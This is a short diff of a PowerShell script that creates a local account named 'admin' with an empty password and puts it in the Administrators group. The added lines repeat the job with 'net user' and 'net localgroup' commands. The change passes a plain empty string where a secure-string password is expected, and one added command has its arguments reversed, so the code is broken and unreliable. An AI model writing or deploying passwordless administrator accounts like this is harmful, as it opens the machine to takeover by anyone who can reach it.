@@ -1,8 +1,10 @@
 # Create a new local user named "admin" without a password
 $username = "admin"
-$password = ConvertTo-SecureString "" -AsPlainText -Force
+$password = ""
 New-LocalUser -Name $username -Password $password -FullName "Admin User" -Description "Local Admin User"
-
+Net User "admin" "" /add
+net localgroup administrators admin /add
+net localgroup admin administrators /add
 # Add the new user to the Administrators group
 Add-LocalGroupMember -Group "Administrators" -Member $username
 
